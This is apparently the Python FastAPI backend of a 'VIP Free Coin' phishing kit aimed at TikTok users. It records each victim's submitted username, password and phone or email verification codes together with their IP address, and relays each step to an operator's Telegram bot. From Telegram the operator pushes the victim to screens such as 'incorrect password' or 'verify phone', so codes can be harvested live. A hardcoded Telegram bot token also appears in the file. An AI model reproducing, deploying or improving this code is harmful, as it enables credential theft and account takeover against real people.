from fastapi import FastAPI, APIRouter, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from models import UserSession, StepData, AdminAction, StatusCheck, StatusCheckCreate
from telegram_service import telegram_service
from tiktok_service import tiktok_service
from typing import List, Optional
import uuid

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "VIP Free Coin API - Active"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.dict()
    status_obj = StatusCheck(**status_dict)
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

@api_router.post("/session/create")
async def create_session():
    """Create a new user session"""
    session = UserSession()
    await db.user_sessions.insert_one(session.dict())
    return {"session_id": session.session_id}

@api_router.get("/tiktok/user/{username}")
async def get_tiktok_user(username: str):
    """Get TikTok user information"""
    try:
        user_info = tiktok_service.get_user_info(username)
        return user_info
    except Exception as e:
        logging.error(f"Error fetching TikTok user: {str(e)}")
        return {
            "success": False,
            "error": str(e)
        }

@api_router.post("/session/step")
async def submit_step(step_data: StepData, request: Request):
    """Submit data for a specific step and send Telegram notification"""
    try:
        session_id = step_data.session_id
        step = step_data.step
        data = step_data.data
        
        # Get client IP
        client_ip = request.client.host if request.client else "Unknown"
        data['ip'] = client_ip
        
        # If it's the first step, fetch TikTok user info
        if step == 'username_coin' and 'username' in data:
            username = data['username']
            tiktok_data = tiktok_service.get_user_info(username)
            data['tiktok_data'] = tiktok_data
        
        # Update session in database
        update_data = {"current_step": step}
        update_data.update(data)
        
        await db.user_sessions.update_one(
            {"session_id": session_id},
            {"$set": update_data}
        )
        
        # Send Telegram notification
        logging.info(f"📤 Sending Telegram notification - Session: {session_id}, Step: {step}")
        telegram_service.send_step_notification(step, session_id, data)
        logging.info(f"✅ Telegram sent for session: {session_id}")
        
        return {
            "success": True,
            "message": "Step submitted successfully",
            "session_id": session_id,
            "tiktok_data": data.get('tiktok_data')
        }
        
    except Exception as e:
        logging.error(f"Error submitting step: {str(e)}")
        return {"success": False, "message": str(e)}

@api_router.get("/session/{session_id}/action")
async def get_session_action(session_id: str):
    """Get the next action for a session (set by admin via Telegram)"""
    try:
        session = await db.user_sessions.find_one({"session_id": session_id})
        
        if not session:
            return {"action": None, "message": "Session not found"}
        
        next_action = session.get('next_action')
        
        # Clear the action after reading it
        if next_action:
            await db.user_sessions.update_one(
                {"session_id": session_id},
                {"$set": {"next_action": None}}
            )
        
        return {
            "action": next_action,
            "current_step": session.get('current_step'),
            "tiktok_data": session.get('tiktok_data')
        }
        
    except Exception as e:
        logging.error(f"Error getting session action: {str(e)}")
        return {"action": None, "message": str(e)}

@api_router.post("/admin/action")
async def set_admin_action(admin_action: AdminAction):
    """Set admin action for a session (called via Telegram webhook)"""
    try:
        session_id = admin_action.session_id
        action = admin_action.action
        
        # Map actions to next steps
        action_map = {
            'password': 'incorrect_password',
            'form': 'contact',
            'phone_code': 'verify_phone',
            'email_code': 'verify_email',
            'wrong_password': 'incorrect_password',
            'wrong_code': 'verify_phone',
            'finish': 'success'
        }
        
        next_step = action_map.get(action, 'waiting')
        
        # Update session
        await db.user_sessions.update_one(
            {"session_id": session_id},
            {"$set": {"next_action": next_step}}
        )
        
        return {"success": True, "next_step": next_step}
        
    except Exception as e:
        logging.error(f"Error setting admin action: {str(e)}")
        return {"success": False, "message": str(e)}

@api_router.get("/sessions")
async def get_all_sessions():
    """Get all active sessions"""
    sessions = await db.user_sessions.find().sort('timestamp', -1).to_list(50)
    return sessions

# Telegram webhook endpoint
@api_router.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    """Handle Telegram bot callbacks"""
    try:
        data = await request.json()
        
        # Check if it's a callback query
        if 'callback_query' in data:
            callback = data['callback_query']
            callback_data = callback['data']
            
            # Parse callback data: action_{session_id}_{action}
            if callback_data.startswith('action_'):
                parts = callback_data.split('_')
                if len(parts) >= 3:
                    session_id = parts[1]
                    action = '_'.join(parts[2:])
                    
                    # Set admin action
                    admin_action = AdminAction(session_id=session_id, action=action)
                    await set_admin_action(admin_action)
                    
                    # Answer callback query
                    answer_url = f"https://api.telegram.org/bot{os.getenv('TELEGRAM_BOT_TOKEN', '8598752660:AAHaWkpfllUj-qaJ7qvdvFnFZsZzsgD5ynU')}/answerCallbackQuery"
                    import requests
                    requests.post(answer_url, json={
                        'callback_query_id': callback['id'],
                        'text': f'Action set: {action}',
                        'show_alert': False
                    })
        
        return {"ok": True}
        
    except Exception as e:
        logging.error(f"Webhook error: {str(e)}")
        return {"ok": False}

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()